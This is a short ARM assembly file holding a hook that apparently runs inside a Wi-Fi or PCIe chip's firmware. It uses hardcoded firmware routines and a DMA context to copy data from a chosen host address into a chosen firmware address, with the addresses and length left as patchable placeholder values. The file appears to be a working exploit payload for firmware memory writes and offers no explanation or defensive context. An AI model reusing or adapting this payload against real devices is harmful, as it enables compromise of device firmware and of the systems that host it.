.code 16
  PUSH {R0}
  ADR R0, hook_arm
  BX R0

.code 32
.align 4
hook_arm:
  POP {R0}

  PUSH {R4-R11, LR}

  //DMAing into the wanted address
  LDR R0, destaddr
  LDR R1, dmalen
  LDR R2, hostaddr
  MOV R3, #1
  BL dma_h2d

  //Returning zero
  MOV R0, #0
  POP {R4-R11, PC}

.align 4
dma_h2d:
  //R0 - DMA FW Destination Address
  //R1 - Size
  //R2 - Host Address
  //R3 - Commit
  PUSH {R4-R11, LR}
  MOV R6, R0            //contents
  MOV R7, R1            //size
  MOV R8, R2            //hostaddr
  MOV R9, R3            //commit

  //Adding an RX descriptor
  LDR R0, pcidi_h2d      //DMA context
  MOV R1, R6             //fwaddr-lo
  MOV R2, #0             //fwaddr-hi
  MOV R3, R7             //size
  LDR R4, dma_rxfast
  BLX R4

  //Adding the corresponding TX descriptor
  LDR R0, pcidi_h2d      //DMA context
  MOV R1, R8             //hostaddr
  MOV R2, R7             //size
  MOV R3, R9             //commit
  LDR R4, dma64_txunframed
  BLX R4

  POP {R4-R11, PC}


.align 4
pcidi_h2d:
    .word 0x1F7320

.align 4
dma_rxfast:
    .word 0x7CB0+1

.align 4
dma64_txunframed:
    .word 0x8F54+1

.align 4
destaddr:
    .word 0xBEEF0303

.align 4
hostaddr:
    .word 0xBEEF0202

.align 4
dmalen:
    .word 0xBEEF0101


